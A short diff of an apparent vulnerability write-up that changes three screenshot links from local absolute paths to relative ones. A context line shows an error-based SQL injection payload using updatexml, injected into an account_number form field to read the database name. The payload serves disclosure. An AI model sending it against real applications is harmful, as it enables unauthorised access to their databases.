@@ -28,8 +28,8 @@ Upgrade-Insecure-Requests: 1
 account_number=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+=&customer=Select+one&account_type=Select+one&account_status=Select+one&update_account=
 ```
 
-![1](/Users/sqlmap/Documents/GitHub/vul-report/img/1.png)
+![1](/img/1.png)
 
-![3](/Users/sqlmap/Documents/GitHub/vul-report/img/3.png)
+![3](/img/3.png)
 
-![2](/Users/sqlmap/Documents/GitHub/vul-report/img/2.png)
+![2](/img/2.png)
